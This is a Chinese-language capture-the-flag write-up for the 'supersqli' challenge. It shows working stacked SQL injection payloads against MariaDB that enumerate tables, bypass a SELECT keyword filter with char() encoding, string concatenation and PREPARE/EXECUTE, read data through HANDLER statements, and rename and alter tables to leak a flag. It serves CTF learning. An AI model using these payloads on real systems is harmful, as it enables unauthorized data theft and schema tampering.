# supersqli
题目看就是sql注入

提交 1' 出现

error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1

* 尝试堆叠注入

```sql
1'; show databases;#
```
看到 supersqli
继续注入
```sql
1';use supersqli;show tables;#
```
看到 表 1919810931114514  words
```sql
1';use supersqli;show columns from `1919810931114514`;#
```
看到 flag 
* 如果你有一个完全由数字组成的表名（尽管这不是一个好的实践），你可以使用反引号（`）在MySQL中，或者使用双引号（"）在SQL Server（需要设置ANSI_QUOTES为ON）或PostgreSQL中来引用它。请注意，Oracle数据库不支持使用双引号来引用标识符，除非你更改了默认的SQL模式。
```sql
1';use supersqli;select * from `1919810931114514`;#
得到
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`
```
可以看到 SELECT 被过滤
## 解法一 ASCII 码 绕过 SELECT
```python
for i in string:
    print(ord(i), end=",")
```
select ：  115,101,108,101,99,116

### payload
```
1';PREPARE a from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE a;#
```
```
1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE a from @sqli;EXECUTE a;#
```
得到flag

## 解法二 concat s‘ ’elect 绕过
### payload
```
1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#
```
得到flag

## 解法三 handle 
直接在后面拼接 ;handler 表名 open; handler 表名 read first;--+ 查看表中第一行数据 
### payload
```
1';
handler`1919810931114514`open as`a`;
handler`a`read first;--+
```
```
1';
handler`1919810931114514` open;
handler`1919810931114514`read next;
```
## 解法四 
* 使用`1' or 1 = 1 #` 看到全部内容 分析得知 words 用于 回显 

我们把1919810931114514这个表更改名字为words,并增加相应的字段，使之回显原1919810931114514这个表的内容。
### payload
第一步 修改表名
```
1';rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100) ;show columns from words;#
```
第二步 万能钥匙查看
```
1' or 1 = 1 #
```